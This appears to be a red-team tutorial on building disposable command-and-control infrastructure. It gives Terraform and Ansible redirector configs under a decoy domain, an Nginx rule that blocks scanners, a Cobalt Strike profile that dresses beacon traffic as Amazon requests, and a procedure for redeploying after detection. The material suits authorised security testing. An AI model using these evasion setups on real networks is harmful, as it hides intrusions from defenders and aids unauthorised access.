---
title: Infrastructure Setup
tags: [infrastructure, terraform, c2, opsec, devops]
description: Automation is key. Using Terraform and Ansible to deploy resilient, disposable Red Team infrastructure.
date: 2024-01-02
---

# Infrastructure Setup (T1583)

Manual setup is slow and prone to errors. If Blue Team burns your IP, you should be able to redeploy a fresh C2 + Redirector chain in under 5 minutes. This requires **Infrastructure as Code (IaC)**.

---

## 1. Automation Stack (Terraform + Ansible)

### Terraform (Provisioning)
Builds the servers (VPS), DNS records, and Firewall rules.

*Example `main.tf` for a DigitalOcean Redirector:*
```hcl
resource "digitalocean_droplet" "redirector" {
  image  = "ubuntu-20-04-x64"
  name   = "cdn-update-node-01"
  region = "nyc3"
  size   = "s-1vcpu-1gb"
  tags   = ["redteam", "redirector"]
}

resource "digitalocean_domain" "default" {
  name       = "totally-legit-updates.com"
  ip_address = digitalocean_droplet.redirector.ipv4_address
}
```

### Ansible (Configuration)
Installs software (Nginx, Socat, Docker) and configures it.

*Example `playbook.yml`:*
```yaml
- hosts: redirectors
  tasks:
    - name: Install Nginx
      apt:
        name: nginx
        state: present
    
    - name: Upload C2 Config
      copy:
        src: ./configs/nginx_c2.conf
        dest: /etc/nginx/sites-enabled/default
      notify: Restart Nginx
```

---

## 2. Advanced Redirectors
Simple forwarding is not enough. You must filter traffic.

### User-Agent Filtering
If the incoming HTTP request has `User-Agent: Curl/7.64` or `Python-urllib`, it is a scanner. Block it.

**Nginx Map Logic**:
```nginx
# /etc/nginx/conf.d/block_scanners.conf
map $http_user_agent $is_scanner {
    default 0;
    "~*Curl" 1;
    "~*Python" 1;
    "~*Nmap" 1;
    "~*Googlebot" 1;
}

server {
    if ($is_scanner) {
        return 403; # Or redirect to https://www.fbi.gov
    }
    # ... proxy_pass logic ...
}
```

---

## 3. Malleable C2 (Traffic Shaping)
Cobalt Strike (and others) allow you to change how your traffic looks. You want to blend in with normal network noise.

### Profile: Amazon Traffic
Make your beacon check-in look like a user browsing Amazon.

```text
http-get {
    set uri "/s/ref=nb_sb_noss_1/168-3546843-189745";
    
    client {
        header "Host" "www.amazon.com";
        header "Accept" "*/*";
        metadata {
            base64;
            prepend "session-id=";
            header "Cookie";
        }
    }
}
```
*Effect*: The Blue Team sees a GET request to Amazon with a Session ID. In reality, that Session ID is your encoded output.

---

## 4. HTTPS & SSL Certificates
Using a self-signed cert is an instant burn.
- **LetsEncrypt**: Free, but the Issuer is "R3/LetsEncrypt", which some orgs block or scrutinize.
- **Cloudflare**: Put your C2 behind Cloudflare. The cert is issued by Cloudflare (High Trust).
- **Custom CA**: For advanced masking, create a generic CA for your lab.

## 5. Burn Procedure
When an IP is flagegd:
1.  **Terraform Destroy**: `terraform destroy -target digitalocean_droplet.redirector`
2.  **Rotate keys**: If SSH keys were on the box, consider them compromised.
3.  **Redeploy**: `terraform apply` gets a fresh IP.
4.  **Update DNS**: Terraform handles this automatically.
